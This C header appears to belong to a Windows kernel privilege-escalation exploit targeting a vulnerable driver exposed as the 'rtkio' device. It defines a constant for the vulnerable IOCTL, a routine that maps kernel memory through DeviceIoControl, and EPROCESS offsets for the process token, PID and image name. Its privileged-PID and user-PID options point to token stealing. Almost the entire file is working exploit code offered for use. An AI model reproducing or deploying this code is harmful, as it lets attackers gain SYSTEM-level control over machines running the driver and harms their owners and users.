#pragma once
#include <windows.h>
#include <TlHelp32.h> 

// #### CONSTANTS ####

#define VULN_IOCTL				(UINT64)0x80002000
#define OUT_BUFF_SIZE			0x8
#define BUFF_SIZE				(UINT64)0x5000
#define START_ADDRESS			(UINT64)0x064000000
#define END_ADDRESS				(UINT64)0x110000000
#define OFFSET_IMAGEFILENAME	0x450+0x80-4	// 0x450 from beginning of EPROCESS to IMAGEFILENAME, 0x60-4 from "Proc" tagged pool to beginning of EPROCESS
#define SIZE_IMAGEFILENAME		15
#define OFFSET_PRIORITYCLASS	0x45f+0x80-4	// PRIORITYCLASS is usually equal 0x2
#define VALUE_PRIORITYCLASS		0x2				// expected value
#define SIZE_PRIORITYCLASS		1
#define OFFSET_PROCESSLOCK		0x2d8+0x80-4
#define SIZE_PROCESSLOCK		0x8
#define VALUE_PROCESSLOCK		0x0				// expected _EX_PUSH_LOCK == 0
#define OFFSET_UNIQUEPROCESSID	0x2e0+0x80-4			
#define SIZE_UNIQUEPROCESSID	0x8
#define OFFSET_TOKEN			0x358+0x80-4			
#define SIZE_TOKEN				0x8
#define OFFSET_FORKINPROGRESS	0x380+0x80-4
#define SIZE_FORKINPROGRESS		0x8
#define DEVICE_NAME				"\\\\.\\rtkio"

#define putchar(c) putc((c),stdout)


// #### STRUCTURES ####

typedef struct inBuffer_ {
	UINT64 addr_to_map;
	UINT64 size_to_map;
} INBUF, *PINBUF;

// #### FUNCTIONS ####

HANDLE open_device(const char* device_symbolic_link)
{
	HANDLE device_handle = INVALID_HANDLE_VALUE;

	device_handle = CreateFileA(device_symbolic_link,               // Device to open
		GENERIC_READ | GENERIC_WRITE,								// Request R/W access
		FILE_SHARE_READ | FILE_SHARE_WRITE,							// Allow other processes to R/W
		NULL,														// Default security attributes
		OPEN_EXISTING,												// Default disposition
		0,															// No flags/attributes
		NULL);														// Don't copy attributes

	return device_handle;
}

void close_device(HANDLE device)
{
	CloseHandle(device);
}

BYTE * map_kernel_buffer(HANDLE device, PINBUF inBuffer)
{
	DWORD bytes_returned = 0;
	BYTE * outBuffer;

	DeviceIoControl(
		device,
		VULN_IOCTL,
		inBuffer,
		sizeof(INBUF),
		&outBuffer,
		sizeof(outBuffer),
		&bytes_returned,
		(LPOVERLAPPED)NULL);

	return (BYTE *)outBuffer;
}


DWORD get_parent_pid(DWORD pid)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32);

	Process32First(hSnapshot, &pe32);

	do
	{
		if (pe32.th32ProcessID == pid)
			return pe32.th32ParentProcessID;
	} while (Process32Next(hSnapshot, &pe32));

	return 0;
}

// ### OPTIONS PARSING ###

DWORDLONG get_priv_pid_opt(int argc, char** argv)
{
	for (int i = 1; i < argc; i++)
	{
		if (strcmp(argv[i], "-privilegedPID") == 0 && i + 1 < argc)
		{
			return atoi(argv[i + 1]);
		}
	}
	return NULL;
}

DWORDLONG get_user_pid_opt(int argc, char** argv)
{
	for (int i = 0; i < argc; i++)
	{
		if (strcmp(argv[i], "-userPID") == 0 && i + 1 < argc)
		{
			return atoi(argv[i + 1]);
		}
	}
	return NULL;
}

DWORDLONG get_start_address_opt(int argc, char** argv)
{
	for (int i = 0; i < argc; i++)
	{
		if (strcmp(argv[i], "-startAddr") == 0 && i + 1 < argc)
		{
			return strtoll(argv[i + 1], NULL, 16);
		}
	}
	return NULL;
}

DWORDLONG get_end_address_opt(int argc, char** argv)
{
	for (int i = 0; i < argc; i++)
	{
		if (strcmp(argv[i], "-endAddr") == 0 && i + 1 < argc)
		{
			return strtoll(argv[i + 1], NULL, 16);
		}
	}
	return NULL;
}

DWORDLONG get_help_opt(int argc, char** argv)
{
	for (int i = 0; i < argc; i++)
	{
		if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "-help") == 0 || strcmp(argv[i], "--help") == 0)
		{
			return 1;
		}
	}
	return NULL;
}
